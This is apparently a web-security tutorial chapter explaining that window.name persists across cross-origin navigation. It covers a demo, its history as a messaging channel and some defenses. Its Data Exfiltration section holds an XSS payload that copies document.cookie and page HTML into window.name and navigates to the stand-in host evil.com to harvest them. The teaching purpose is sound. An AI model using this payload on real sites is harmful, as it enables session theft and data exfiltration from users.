# 12 - Cross-Domain Data Transfer via `window.name`

## The `window.name` Property

`window.name` is a browser property that persists across page navigations — even cross-origin ones. When a page sets `window.name` and then navigates to a different domain, the new page can read the value. This breaks the same-origin policy's intent.

## Demonstration

### Page 1: `http://www.a.com/test.html`

```html
<body>
<script>
window.name = "test";
alert(document.domain + "   " + window.name);
window.location = "http://www.b.com/test1.html";
</script>
</body>
```

This page sets `window.name` to `"test"`, shows `a.com   test`, then navigates to `b.com`.

### Page 2: `http://www.b.com/test1.html`

```html
<body>
<script>
alert(document.domain + "   " + window.name);
</script>
</body>
```

This page shows `b.com   test` — it can read the value set by `a.com`.

## Why This Works

- `window.name` is bound to the browser tab/window, not to the origin
- It survives full page navigations, including cross-domain redirects
- The new page inherits whatever value the previous page left in `window.name`
- It can hold a large string (several MB in most browsers)

## Attack Scenarios

### Data Exfiltration

An attacker who achieves XSS on `a.com` can steal data without making any network requests from the victim's page:

```javascript
// XSS payload on a.com
window.name = document.cookie + "|" + document.body.innerHTML;
window.location = "http://www.evil.com/collect.html";
```

On `evil.com`, the attacker reads `window.name` to harvest the stolen data. This is stealthier than an `<img>` beacon because:
- No outbound request is visible in `a.com`'s network logs
- The data transfer happens via navigation, not a resource fetch
- WAFs and CSP `connect-src` rules don't block it

### Cross-Domain Communication (Pre-postMessage Era)

Before `postMessage` existed, `window.name` was used as a legitimate cross-domain messaging channel:

1. Page A sets `window.name = JSON.stringify(data)`
2. Page A navigates an iframe to Page B
3. Page B reads `window.name` and processes the data

This was a common technique in early AJAX libraries for cross-domain data transfer.

## Defenses

- Clear `window.name` on page load if cross-domain data transfer is not expected:
  ```javascript
  if (document.referrer && new URL(document.referrer).origin !== location.origin) {
    window.name = "";
  }
  ```
- Content Security Policy — `navigate-to` directive (limited browser support) can restrict where a page navigates
- Prevent XSS in the first place — `window.name` exfiltration requires code execution on the target page
- Modern alternative: use `postMessage` for intentional cross-origin communication, which requires explicit opt-in from both sides
